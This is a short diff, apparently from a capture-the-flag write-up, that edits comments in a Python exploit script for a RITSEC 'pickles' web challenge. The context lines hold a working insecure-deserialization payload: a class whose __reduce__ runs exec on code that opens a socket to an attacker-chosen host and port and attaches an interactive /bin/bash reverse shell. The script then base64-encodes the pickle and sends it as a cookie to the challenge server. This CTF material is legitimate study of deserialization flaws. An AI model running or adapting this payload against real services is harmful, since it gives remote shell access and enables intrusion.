@@ -75,9 +75,9 @@ class RCE:
         #code here will be executed only during pickling, not unpickling (only the return statement will be coded in the pickled object).
         return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
 
-pickled_bytes=pickle.dumps(RCE())    #Object instance ---> Pickle Format
-pickled_base64_bytes = base64.b64encode(pickled_bytes)    #Pickle format ---> Base64 encoding bytes
-pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Bsse64 encoding bytes ---> String format
+pickled_bytes=pickle.dumps(RCE())    #Object instance ---> Pickle format (bytes)
+pickled_base64_bytes = base64.b64encode(pickled_bytes)    #Pickle format (bytes) ---> Base64 encoding (bytes)
+pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Base64 encoding (bytes) ---> Base64 encoding (string)
 response=requests.get("https://pickles-web.challenges.ctf.ritsec.club/order",cookies={"order":pickled_base64_string})
 print(response.text)
 ```
